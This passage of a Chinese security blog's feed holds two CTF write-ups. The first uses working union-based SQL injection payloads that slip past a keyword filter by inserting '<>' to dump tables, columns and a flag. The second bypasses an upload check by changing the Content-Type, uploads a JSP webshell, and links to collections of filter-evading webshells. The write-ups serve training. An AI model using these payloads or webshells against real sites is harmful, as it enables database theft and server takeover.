class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union selec&lt;&gt;t  1,group_concat(table_name),3 from information_schema.tables where table_schema =database()</span><br></pre></td></tr></table></figure><p>爆出 info 表</p><h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union selec&lt;&gt;t  1,group_concat(column_name),3 from information_schema.columns where table_name= &apos;info&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,title,flAg_T5ZNdrm</span><br></pre></td></tr></table></figure><h4 id="爆flag"><a href="#爆flag" class="headerlink" title="爆flag"></a>爆flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union selec&lt;&gt;t  1,group_concat(flAg_T5ZNdrm),3 from info</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1d80a990-37a8-48e2-9fd5-a4de39cbcf60&#125;,test</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.cnblogs.com/wangleiblog/p/5924451.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangleiblog/p/5924451.html</a></p><p><a href="http://www.2cto.com/Article/201301/182519.html" target="_blank" rel="noopener">sql注入字符绕过方法：</a></p><p><a href="http://blog.csdn.net/praifire/article/details/51926863" target="_blank" rel="noopener">sql注入实例一枚：</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;首先看看是否有字符过滤&quot;&gt;&lt;a href=&quot;#首先看看是否有字符过滤&quot; class=&quot;headerlink&quot; title=&quot;首先看看是否有字符过滤&quot;&gt;&lt;/a&gt;首先看看是否有字符过滤&lt;/h4&gt;&lt;p&gt;把所有字符串都试一遍&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/index.php?id = 1~!@$%^&amp;amp;*()_+-=&amp;#123;&amp;#125;[]&amp;apos;&amp;quot;;&amp;lt;&amp;gt;/?&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现&amp;lt;&amp;gt;直接被删除，即是：&lt;code&gt;sele&amp;lt;&amp;gt;ct --&amp;gt; select&lt;/code&gt;&lt;br&gt;符号+被替换为空格等等&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="I春秋" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/I%E6%98%A5%E7%A7%8B/"/>
    
    
      <category term="SQL" scheme="http://blog.Lhaihai.wang/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>红帽杯Web-simple_upload</title>
    <link href="http://blog.Lhaihai.wang/2018/05/02/%E7%BA%A2%E5%B8%BD%E6%9D%AFWeb-simple-upload/"/>
    <id>http://blog.Lhaihai.wang/2018/05/02/红帽杯Web-simple-upload/</id>
    <published>2018-05-02T02:57:34.000Z</published>
    <updated>2018-05-02T03:04:25.736Z</updated>
    
    <content type="html"><![CDATA[<h3 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple upload"></a>simple upload</h3><p>这次在你面前的网站的功能非常简单，接受挑战吧！</p><h4 id="0x01-抓包发现admin-0，改为1登录"><a href="#0x01-抓包发现admin-0，改为1登录" class="headerlink" title="0x01 抓包发现admin=0，改为1登录"></a>0x01 抓包发现admin=0，改为1登录</h4><a id="more"></a><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E7%BA%A2%E5%B8%BD%E6%9D%AF.assets/1525084268144.png" alt="1525084268144"></p><h4 id="0x02-文件上传"><a href="#0x02-文件上传" class="headerlink" title="0x02 文件上传"></a>0x02 文件上传</h4><p>只要把<code>Content-Type</code> 改为<code>image/jpeg</code>就可以绕过</p><h4 id="0x03-上传木马"><a href="#0x03-上传木马" class="headerlink" title="0x03 上传木马"></a>0x03 上传木马</h4><p>测试了php，asp都不行，最后用jsp</p><p>在根目录发现flag，下载</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E7%BA%A2%E5%B8%BD%E6%9D%AF.assets/1525084399401.png" alt="1525084399401"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E7%BA%A2%E5%B8%BD%E6%9D%AF.assets/1525084525023.png" alt="1525084525023"></p><p>Jsp webshell:<a href="https://github.com/dingody/jspy" target="_blank" rel="noopener">https://github.com/dingody/jspy</a></p><p><a href="http://www.cnblogs.com/yubenliu/p/5556090.html" target="_blank" rel="noopener">一句话木马和中国菜刀的结合拿webshell</a></p><p><a href="https://blog.csdn.net/settoken/article/details/53114781" target="_blank" rel="noopener">2016年11月整理的最新php免杀一句话木马, 2017php免杀一句话(php过狗一句话,过狗菜刀,2016过狗一句话,2016php免杀一句话,php过waf一句话)</a></p><p><a href="https://blog.csdn.net/settoken/article/details/51581776" target="_blank" rel="noopener">整理的最新WebSHell (php过狗一句话,过狗菜刀,2016过狗一句话,2016php免杀一句话)</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;simple-upload&quot;&gt;&lt;a href=&quot;#simple-upload&quot; class=&quot;headerlink&quot; title=&quot;simple upload&quot;&gt;&lt;/a&gt;simple upload&lt;/h3&gt;&lt;p&gt;这次在你面前的网站的功能非常简单，接受挑战吧！&lt;/p&gt;
&lt;h4 id=&quot;0x01-抓包发现admin-0，改为1登录&quot;&gt;&lt;a href=&quot;#0x01-抓包发现admin-0，改为1登录&quot; class=&quot;headerlink&quot; title=&quot;0x01 抓包发现admin=0，改为1登录&quot;&gt;&lt;/a&gt;0x01 抓包发现admin=0，改为1登录&lt;/h4&gt;
    
    </summary>
    
      <category term="WriteUp" scheme="http://blog.Lhaihai.wang/categories/WriteUp/"/>
    
    
      <category term="upload" scheme="http://blog.Lhaihai.wang/tags/upload/"/>
    
  </entry>
  
</feed>
